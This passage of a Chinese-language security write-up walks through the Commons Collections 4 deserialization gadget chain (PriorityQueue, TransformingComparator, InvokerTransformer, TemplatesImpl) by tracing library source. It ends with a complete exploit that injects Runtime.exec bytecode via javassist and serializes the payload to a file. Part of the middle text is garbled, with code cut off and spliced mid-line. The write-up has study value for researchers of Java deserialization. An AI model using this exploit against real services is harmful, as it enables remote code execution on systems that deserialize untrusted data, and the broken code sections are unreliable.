    public O transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var4) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var6);
            }
        }
    }
可以看到transform方法返回值为任意的类型；那么这个点就很宽松了;下面才是这个链有意思的地方；
可将其input赋值为TemplatesImpl类对象，然后getMethod就为其类对象下的newInstance方法；在这个方法里有我们利用的点：追溯下：
    public synchronized Transformer newTransformer() throws TransformerConfigurationException {
        TransformerImpl transformer = new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory);
        if (this._uriResolver != null) {
            transformer.setURIResolver(this._uriResolver);
        }
        if (this._tfactory.getFeature("http://javax.xml.XMLConstants/feature/secure-processing")) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
在这里面掉用了getTransletInstance方法，继续追溯一下：
    private Translet getTransletInstance() throws TransformerConfigurationException {
        ErrorMsg err;
        try {
            if (this._name == null) {
                return null;
            } else {
                if (this._class == null) {
                    this.defineTransletClasses();
                }
                AbstractTranslet translet = (AbstractTranslet)this._class[this._transletIndex].newInstance();
                translet.postInitialization();
                translet.setTemplates(this);
                if (this._auxClasses != null) {
                    translet.setAuxiliaryClasses(this._auxClasses);
                }
                return translet;
            }
        } catch (InstantiationException var3) {
            err = new ErrorMsg("TRANSLET_OBJECT_ERR", this._name);
            throw new TransformerConfigurationException(err.toString());
        } catch (IllegalAccessException var4) {
            err = new ErrorMsg("TRANSLET_OBJECT_ERR", this._name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
看到这里进行了._class值的判断，判断其是否为空；然后如果为空的话调用defineTransletClasses方法，这里追溯下：
    private void defineTransletClasses() throws TransformerConfigurationException {
        if (this._bytecodes == null) {
            ErrorMsg err = new ErrorMsg("NO_TRANSLET_CLASS_ERR");
            throw new TransformerConfigurationException(err.toString());
        } else {
            TemplatesImpl.TransletClassLoader loader = (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader());
                }
            });
            ErrorMsg err;
            try {
                int classCount = this._bytecodes.length;
                this._class = new Class[classCount];
                if (classCount > 1) {
                    this._auxClasses = new Hashtable();
                }
                for(int i = 0; i  comparator) {
        // Note: This restriction of at least one is not actually needed,
        // but continues for 1.5 compatibility
        if (initialCapacity = queue.length)
            grow(i + 1);
        size = i + 1;
        if (i == 0)
            queue[0] = e;
        else
            siftUp(i, e);
        return true;
    }
当我们后期add的时候，会进行size的统计，并将其add的对象放入到queue数组中去；这也自然不会影响到我们链的走向；还有一个点我在编写exp的时候也遇到，我最开始想直接在实力化优先级队列的时候传入TemplatesImpl对象，然后直接进行链条的拼接，但是会触发ClassLoader的错误，导致两个ClassLoader加载同一个class；所以还是首先拿1来进行站位，随后再修改；
放出最后的exp：
    package com.company;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.InvokerTransformer;
    import org.apache.xalan.xsltc.runtime.AbstractTranslet;
    import org.apache.xalan.xsltc.trax.TemplatesImpl;
    import java.io.*;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class javassist {
        public static class s1mple {
        }
        public static void main(String[] args) throws Exception {
            String AbstractTranslet = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
            String TemplatesImpl = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            ClassPool classpool = ClassPool.getDefault();
            classpool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            classpool.insertClassPath(new ClassClassPath(s1mple.class));
            classpool.insertClassPath(new ClassClassPath(s1mple.class));
            CtClass s2mple = classpool.get(s1mple.class.getName());
            CtClass s3mple = classpool.get(Class.forName(AbstractTranslet).getName());
            s2mple.setSuperclass(s3mple);
            s2mple.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\");");//弹出计算器；；
            byte[] bt = s2mple.toBytecode();
            Class templatesimpl = Class.forName(TemplatesImpl);
            Constructor constructor= templatesimpl.getConstructor();
            Object temp = constructor.newInstance();
            //Object temp = new TemplatesImpl();两种写法含义相同；结果也相同；
            Field name = templatesimpl.getDeclaredField("_name");
            name.setAccessible(true);
            name.set(temp,"s1mple_hack");
            Field bytecode = templatesimpl.getDeclaredField("_bytecodes");
            bytecode.setAccessible(true);
            bytecode.set(temp,new byte[][]{bt});
            PriorityQueue priority = new PriorityQueue();
            priority.add(1);
            priority.add(1);
            TransformingComparator trans = new TransformingComparator(new InvokerTransformer("newTransformer",new Class[]{}, new Object[]{}));
            Class pri = priority.getClass();
            Field que = pri.getDeclaredField("queue");
            que.setAccessible(true);
            Object[] innerArr = (Object[]) que.get(priority);
            innerArr[0] = temp;
            innerArr[1] = temp;
            Field com = pri.getDeclaredField("comparator");
            com.setAccessible(true);
            com.set(priority,trans);
            ObjectOutputStream shuchu = new ObjectOutputStream(new FileOutputStream("a.bin"));
            shuchu.writeObject(priority);
        }